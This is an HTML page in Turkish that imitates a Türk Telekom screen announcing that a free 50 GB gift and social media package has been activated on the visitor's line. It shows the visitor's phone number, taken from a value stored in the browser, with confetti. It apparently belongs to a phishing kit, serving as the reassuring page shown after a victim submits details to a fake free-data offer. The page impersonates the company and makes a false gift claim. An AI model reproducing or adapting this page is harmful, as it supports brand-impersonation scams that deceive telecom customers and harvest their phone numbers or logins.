<!DOCTYPE html>
<html lang="tr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Türk Telekom - Tebrikler</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
</head>

<body>
    <canvas id="confettiCanvas"></canvas>
    <div class="page-wrapper">
        <!-- Status bar -->
        <div class="status-bar">
            <div class="status-badge">
                <span class="status-dot"></span>
                4.5G
            </div>
            <div class="status-icons">
                <span>📶</span>
                <span>🔋</span>
            </div>
        </div>

        <!-- Success area -->
        <div class="success-area">
            <div class="success-check">
                <svg viewBox="0 0 80 80" fill="none">
                    <circle cx="40" cy="40" r="36" stroke="#4caf50" stroke-width="2.5" fill="none" class="circle-s" />
                    <path d="M24 40L34 50L56 28" stroke="#4caf50" stroke-width="3" stroke-linecap="round"
                        stroke-linejoin="round" fill="none" class="check-s" />
                </svg>
            </div>
            <div class="success-heading">Tebrikler! 🎉</div>
            <div class="success-sub">Paketiniz hattınıza başarıyla tanımlandı.</div>
        </div>

        <!-- Gift card -->
        <div class="gift-card">
            <div class="gift-card-header">
                <div>
                    <div class="gift-logo-mini">
                        <svg viewBox="0 0 24 20" fill="none">
                            <polygon points="2,10 8,4 8,16" fill="#0066ff" />
                            <polygon points="7,10 13,4 13,16" fill="#00c8ff" />
                            <polygon points="12,10 18,4 18,16" fill="#00e6a0" />
                        </svg>
                    </div>
                    <div class="gift-label">HEDİYE PAKETİ</div>
                </div>
                <div class="gift-sim"></div>
            </div>
            <div class="gift-amount">50 GB</div>
            <div class="gift-extra">+ Sosyal Medya Paketi</div>
            <div class="gift-details">
                <div class="gift-detail-item">
                    <div class="gift-detail-label">TANIMLANAN HAT</div>
                    <div class="gift-detail-value" id="hatNo">05XX XXX XX XX</div>
                </div>
                <div class="gift-detail-item">
                    <div class="gift-detail-label">TANIMLANMA TARİHİ</div>
                    <div class="gift-detail-value" id="tarih"></div>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="dark-footer">
            © 2026 Türk Telekom A.Ş. Tüm hakları saklıdır.
        </div>
    </div>

    <script>
        // Format phone number for display
        const phone = localStorage.getItem('tg_display_phone') || '5XXXXXXXXX';
        const p = '0' + phone;
        const formatted = p.length >= 11
            ? p.slice(0, 4) + ' ' + p.slice(4, 7) + ' ' + p.slice(7, 9) + ' ' + p.slice(9, 11)
            : p;
        document.getElementById('hatNo').textContent = formatted;

        // Set today's date
        const now = new Date();
        const day = String(now.getDate()).padStart(2, '0');
        const month = String(now.getMonth() + 1).padStart(2, '0');
        const year = now.getFullYear();
        document.getElementById('tarih').textContent = `${day}.${month}.${year}`;

        // Confetti animation
        const canvas = document.getElementById('confettiCanvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const confettiColors = ['#ff4466', '#00d4ff', '#4caf50', '#ffcc00', '#ff6600', '#aa44ff', '#00e6a0', '#0066ff'];
        const confettiPieces = [];

        for (let i = 0; i < 120; i++) {
            confettiPieces.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height - canvas.height,
                w: Math.random() * 10 + 4,
                h: Math.random() * 6 + 3,
                color: confettiColors[Math.floor(Math.random() * confettiColors.length)],
                speed: Math.random() * 3 + 1.5,
                angle: Math.random() * Math.PI * 2,
                spin: (Math.random() - 0.5) * 0.15,
                drift: (Math.random() - 0.5) * 1.5
            });
        }

        function animateConfetti() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            let active = false;

            confettiPieces.forEach(p => {
                if (p.y < canvas.height + 20) {
                    active = true;
                    p.y += p.speed;
                    p.x += p.drift;
                    p.angle += p.spin;

                    ctx.save();
                    ctx.translate(p.x, p.y);
                    ctx.rotate(p.angle);
                    ctx.fillStyle = p.color;
                    ctx.fillRect(-p.w / 2, -p.h / 2, p.w, p.h);
                    ctx.restore();
                }
            });

            if (active) {
                requestAnimationFrame(animateConfetti);
            }
        }

        animateConfetti();

        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
    </script>
</body>

</html>
